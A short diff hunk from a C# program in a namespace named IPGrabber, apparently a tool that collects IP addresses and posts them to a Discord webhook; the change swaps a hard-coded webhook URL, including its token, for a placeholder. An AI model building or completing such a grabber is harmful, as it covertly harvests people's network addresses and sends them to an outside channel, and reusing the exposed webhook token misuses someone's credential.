@@ -10,7 +10,7 @@ namespace IPGrabber
         static async Task Main(string[] args)
         {
             // Your Discord webhook URL
-            string webhookUrl = "https://discord.com/api/webhooks/1227818343893827605/l3hdx3qasxBjEHKHIL90cZoo2yS1ohSYeO0X03ueGmzIblDulFIbhqDHSAY7MFHl-Fls";
+            string webhookUrl = "DISCORD_BOT_WEBHOOK_HERE";
 
             // Message to send
             string message = $@"
